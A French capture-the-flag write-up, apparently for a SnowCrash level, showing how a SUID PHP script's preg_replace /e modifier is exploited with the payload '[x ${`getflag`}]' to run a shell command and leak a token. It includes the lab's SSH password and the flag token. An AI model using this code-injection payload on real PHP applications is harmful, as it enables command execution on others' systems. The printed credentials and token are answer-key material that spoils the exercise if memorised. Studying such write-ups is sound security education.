# Level06

Connectez-vous en tant que `level06`.

    $ ssh 192.168.1.124 -p 4242 -l level06
    level06@192.168.1.124's password: viuaaale9huek52boumoomioc
    
 ---

Un script PHP et un exécutable `SUID` se trouvent dans le répertoire personnel.

    $ ls -l
    12 au total
    -rwsr-x---+ 1 flag06 level06 7503 30 août 2015 level06
    -rwxr-x--- 1 flag06 level06 356 5 mars 2016 level06.php

    $ ./level06
    Avertissement PHP : file_get_contents() : le nom de fichier ne peut pas être vide dans /home/user/level06/level06.php à la ligne 4
    
    $ echo 'Hello !' > /tmp/hello

    $ ./level06 /tmp/hello
    Hello !

`file_get_contents` - lit le fichier entier dans une chaîne.

`preg_replace` - l'utilisation avec le modificateur `/e` était assez courante parmi les scripts, les applications et les interfaces PHP jusqu'à il y a quelques années.

Il est possible d'exécuter le shell en PHP avec des backticks.

En utilisant des [variables variables](https://www.php.net/manual/en/language.variables.variable.php), une erreur peut être générée qui affichera le flag.

    $ echo '[x ${`getflag`}]' > /tmp/flag06

    $ ./level06 /tmp/flag06
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
     in /home/user/level06/level06.php(4) : regexp code on line 1

PHP a évalué `getflag` puis a essayé d'imprimer la variable, mais comme il n'était pas défini, il affiche une erreur.
